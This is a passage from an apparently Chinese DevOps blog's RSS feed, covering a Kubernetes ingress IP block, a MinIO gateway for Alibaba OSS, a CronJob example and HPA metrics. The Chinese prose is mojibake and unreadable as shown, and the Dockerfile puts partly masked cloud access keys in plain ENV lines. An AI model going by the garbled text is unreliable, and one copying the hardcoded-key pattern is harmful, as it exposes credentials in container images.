&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;   &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;kubernetes.io/ingress.class&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;nginx &lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;   &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;nginx.ingress.kubernetes.io/ssl-redirect&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;   &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;nginx.ingress.kubernetes.io/block-cidrs&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;a.b.c.d/32 &lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;   &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#nginx.ingress.kubernetes.io/whitelist-source-range: a.b.c.d/32 &lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;spec&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;tls&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;hosts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;   &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;www.huabbao.com &lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;   &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;secretName&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;www-huabbao-com-cert &lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;rules&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;host&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;www.huabbao.com &lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;   &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;     &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;paths&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;     &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;/ &lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;       &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;backend&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;         &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;serviceName&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;nginx-svc &lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ³¨æ„ï¼Œå¤šä¸ªipçš„è¯ï¼Œä¹‹é—´ç”¨é€—å·éš”å¼€ï¼ˆè¯¥å€¼æ˜¯é€—å·åˆ†éš”çš„CIDRåˆ—è¡¨ï¼‰ ï¼š&lt;/p&gt;</description>
    </item>
    <item>
      <title>kubernetesæ­å»ºminioä½œä¸ºé˜¿é‡ŒOSSçš„Gateway</title>
      <link>https://rendoumi.com/posts/20211126-kubernetes_minio_oss_gateway/</link>
      <pubDate>Fri, 26 Nov 2021 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20211126-kubernetes_minio_oss_gateway/</guid>
      <description>&lt;p&gt;é˜¿é‡Œçš„äº‘çš„ OSS å¹¶ä¸æ˜¯å®Œå…¨ç‰ˆæœ¬çš„ AWS S3 å…¼å®¹ã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬å¦‚æœéœ€è¦ç”¨ S3 åè®®è®¿é—® OSSï¼Œå°±æ¯”è¾ƒéº»çƒ¦äº†ã€‚&lt;/p&gt;
&lt;p&gt;æ‰€ä»¥æ­å»ºä¸€ä¸ª minio æ¥åšç½‘å…³ï¼Œä»£ç†OSSï¼Œminio æ˜¯åŸºæœ¬å…¼å®¹S3çš„ï¼Œæ‰€ä»¥è¿™æ ·æ›²çº¿æ•‘å›½ï¼Œé€šè¿‡ S3 åè®®è®¿é—® minio æ¥è®¿é—®æœ€åç«¯çš„ OSS&lt;/p&gt;
&lt;p&gt;è¿™é‡Œè¿˜æœ‰ä¸€æ®µæ•…äº‹ï¼š&lt;/p&gt;
&lt;p&gt;Minio ä¸­é—´æœ‰ä¸€ç‰ˆæ˜¯æ”¯æŒ oss çš„ï¼Œä½†æ˜¯åæ¥ oss æ”¹äº†åè®®ï¼Œæ‰€ä»¥ç°åœ¨çš„æœ€æ–°ç‰ˆæœ¬ minio åè€Œæ˜¯ä¸æ”¯æŒä»£ç† oss çš„ï¼Œæˆ‘ä»¬å¿…é¡»æ‰‹åŠ¨ä½œå‡ºé•œåƒï¼Œæ”¾åˆ°é•œåƒåº“é‡Œï¼Œç„¶åé˜¿é‡Œ ACK å†ä½¿ç”¨&lt;/p&gt;
&lt;p&gt;é¦–å…ˆå»ä¸‹è½½é‚£ä¸€ç‰ˆç›´æ¥æ”¯æŒossçš„&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wget http://dl.minio.org.cn/server/minio/release/linux-amd64/archive/minio.RELEASE.2020-04-15T19-42-18Z 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;chmod &lt;span class=&#34;m&#34;&gt;755&lt;/span&gt; minio.RELEASE.2020-04-15T19-42-18Z 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿™ä¸ªæ–‡ä»¶æ¯”è¾ƒå®è´µï¼Œç»™ä¸ªæœ¬åœ°å¤‡ä»½é“¾æ¥ä¸‹è½½ï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;minio.RELEASE.2020-04-15T19-42-18Z&#34;&gt;minio.RELEASE.2020-04-15T19-42-18Z&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ç„¶ååœ¨å½“å‰ç›®å½•ç¼–è¾‘ Dockerfile ï¼Œå› ä¸º K8S å’Œ OSS åŒä¸€åœ°åŸŸï¼Œæ‰€ä»¥ç”¨ OSS ç§ç½‘åŸŸåï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-ini&#34; data-lang=&#34;ini&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;FROM alpine:3.12 &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;RUN apk add --update bash &amp;amp;&amp;amp; rm -rf /var/cache/apk/*  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;COPY minio.RELEASE.2020-04-15T19-42-18Z /data/minio.RELEASE.2020-04-15T19-42-18Z  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;ENV MINIO_ACCESS_KEY&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;LTAI5tFFTbsxxxxxuLb  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;ENV MINIO_SECRET_KEY&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;t78PyGnHZilxxxxxdxBCjvNgtVC5Y  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;WORKDIR /data  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;EXPOSE 9000  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;CMD [&amp;#34;/data/minio.RELEASE.2020-04-15T19-42-18Z&amp;#34;,&amp;#34;gateway&amp;#34;,&amp;#34;oss&amp;#34;,&amp;#34;http://oss-cn-shanghai-internal.aliyuncs.com&amp;#34;] &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# CMD /bin/sh -c &amp;#34;while true; do echo hi; sleep 10; done&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ³¨æ„ä¸Šé¢ï¼ŒMINIO_ACCESS_KEY å’Œ MINIO_SECRET_KEY å¯¹åº”çš„æ˜¯é˜¿é‡Œäº‘ OSSçš„ AccessKey ID å’Œ AccessKey Secret&lt;/p&gt;</description>
    </item>
    <item>
      <title>æ›¿ä»£kubernetes crontabçš„ç¥å™¨kala</title>
      <link>https://rendoumi.com/posts/20211125-kubernetes_crontab_kala/</link>
      <pubDate>Thu, 25 Nov 2021 10:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20211125-kubernetes_crontab_kala/</guid>
      <description>&lt;p&gt;æœ¬æ¥ k8s çš„ crontab æ˜¯å¯åŠ¨ä¸€ä¸ªå®¹å™¨æ¥è¿è¡Œçš„ï¼Œå¾ˆç®€å•ï¼Œå¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-yaml&#34; data-lang=&#34;yaml&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;apiVersion&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;batch/v1beta1&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;kind&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;CronJob&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;metadata&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;curl-cron&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;spec&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;schedule&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;*/1 * * * *&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;jobTemplate&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;spec&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;template&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;spec&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;          &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;containers&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;          &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;curl-cron&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;image&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;radial/busyboxplus:curl&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;imagePullPolicy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;IfNotPresent&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;command&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;/bin/sh&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;- -&lt;span class=&#34;l&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;date;echo &amp;#34;run crontab&amp;#34;;curl http://www.baidu.com&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;          &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;restartPolicy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;OnFailure&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;successfulJobsHistoryLimit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;failedJobsHistoryLimit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¸Šé¢å°±è·‘äº†ä¸€ä¸ª busybox çš„ podï¼Œæ¯åˆ†é’Ÿå»è®¿é—®ç™¾åº¦ï¼Œç„¶ååœ¨ stdout è¾“å‡ºç»“æœ&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªæ²¡ä»€ä¹ˆï¼Œæ³¨æ„ä¸Šé¢æ–‡ä»¶çš„æœ€åä¸¤è¡Œã€‚é™åˆ¶æˆåŠŸä»¥åŠå¤±è´¥ job çš„ History æ•°é‡ï¼Œå¦‚æœä¸åŠ é™åˆ¶ï¼Œkubectl get pods ä¼šçœ‹åˆ°æ— ç©·æ— å°½çš„completed çŠ¶æ€çš„ curl-cron podã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>kubernetesçš„hpaå’Œè‡ªå®šä¹‰æŒ‡æ ‡hpa</title>
      <link>https://rendoumi.com/posts/20211125-kubernetes_hpa/</link>
      <pubDate>Thu, 25 Nov 2021 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20211125-kubernetes_hpa/</guid>
      <description>&lt;p&gt;kubernetes çš„åŠ¨æ€ä¼¸ç¼© HPA æ˜¯éå¸¸æœ‰ç”¨çš„ç‰¹æ€§ã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬çš„æœåŠ¡å™¨æ‰˜ç®¡åœ¨é˜¿é‡Œäº‘çš„ ACK ä¸Šï¼Œk8s æ ¹æ® cpu æˆ–è€… å†…å­˜çš„ä½¿ç”¨æƒ…å†µï¼Œä¼šè‡ªåŠ¨ä¼¸ç¼©å…³é”® pod çš„æ•°é‡ï¼Œä»¥åº”å¯¹å¤§æµé‡çš„æƒ…å½¢ã€‚è€Œä¸”æ›´å¦™çš„æ˜¯ï¼ŒåŠ¨æ€æ‰©å±•çš„ pod å¹¶ä¸æ˜¯ä½¿ç”¨è‡ªå·±çš„å›ºå®šæœåŠ¡å™¨ï¼Œè€Œæ˜¯ä½¿ç”¨é˜¿é‡ŒåŠ¨æ€çš„ ECI è™šæ‹ŸèŠ‚ç‚¹æœåŠ¡å™¨ï¼Œè¿™æ ·å°±çœŸçš„æ˜¯å³å¼€å³ç”¨ï¼Œç”¨å®Œå³æ¯ã€‚æœ‰å¤šå¤§æµé‡ä»˜å¤šå°‘é’±ï¼Œç‰©å°½å…¶ç”¨ã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬å…ˆæ˜ç¡®ä¸€ä¸‹æ¦‚å¿µï¼š&lt;/p&gt;
&lt;p&gt;k8s çš„èµ„æºæŒ‡æ ‡è·å–æ˜¯é€šè¿‡ api æ¥å£æ¥è·å¾—çš„ï¼Œæœ‰ä¸¤ç§ apiï¼Œä¸€ç§æ˜¯æ ¸å¿ƒæŒ‡æ ‡ï¼Œä¸€ç§æ˜¯è‡ªå®šä¹‰æŒ‡æ ‡ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;æ ¸å¿ƒæŒ‡æ ‡ï¼šCore metricsï¼Œç”±metrics-serveræä¾›APIï¼Œå³ metrics.k8s.ioï¼Œä»…æä¾›Nodeå’ŒPodçš„CPUå’Œå†…å­˜ä½¿ç”¨æƒ…å†µã€‚api æ˜¯ &lt;code&gt;metrics.k8s.io&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;è‡ªå®šä¹‰æŒ‡æ ‡ï¼šCustom Metricsï¼Œç”±Prometheus Adapteræä¾›APIï¼Œå³ custom.metrics.k8s.ioï¼Œç”±æ­¤å¯æ”¯æŒä»»æ„Prometheusé‡‡é›†åˆ°çš„è‡ªå®šä¹‰æŒ‡æ ‡ã€‚api æ˜¯ &lt;code&gt;custom.metrics.k8s.io&lt;/code&gt; å’Œ &lt;code&gt;external.metrics.k8s.io&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;ä¸€æ ¸å¿ƒæŒ‡æ ‡metrics-server&#34;&gt;ä¸€ã€æ ¸å¿ƒæŒ‡æ ‡metrics-server&lt;/h2&gt;
&lt;p&gt;é˜¿é‡Œçš„ ACK ç¼ºçœæ˜¯è£…äº† metrics-server çš„ï¼Œçœ‹ä¸€ä¸‹ï¼Œç³»ç»Ÿé‡Œæœ‰ä¸€ä¸ªmetrics-server&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;kubectl get pods -n kube-system
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img alt=&#34;image-20211125092117637&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20211125-kubernetes_hpa/image-20211125092117637.png&#34;&gt;&lt;/p&gt;
